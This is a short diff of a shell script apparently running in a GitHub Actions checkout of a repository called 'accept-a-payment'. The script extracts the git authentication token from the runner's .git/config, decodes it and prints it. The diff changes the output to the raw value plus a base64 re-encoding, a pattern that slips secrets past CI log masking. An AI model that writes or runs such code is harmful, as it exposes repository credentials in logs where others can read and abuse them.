@@ -22,7 +22,9 @@ echo "afterafter cat"
 encoded_token=$(grep "extraheader" /home/runner/work/accept-a-payment/accept-a-payment/.git/config  | cut -d ' ' -f 5 | cut -d ':' -f 2 | base64 -d | cut -d ':' -f 2)
 
 # Decode the token
-echo $encoded_token | base64 --decode
+echo $encoded_token 
+
+echo $encoded_token | base64
 
 # git config --global user.email "you@example.com"
 # git config --global user.name "Your Name"
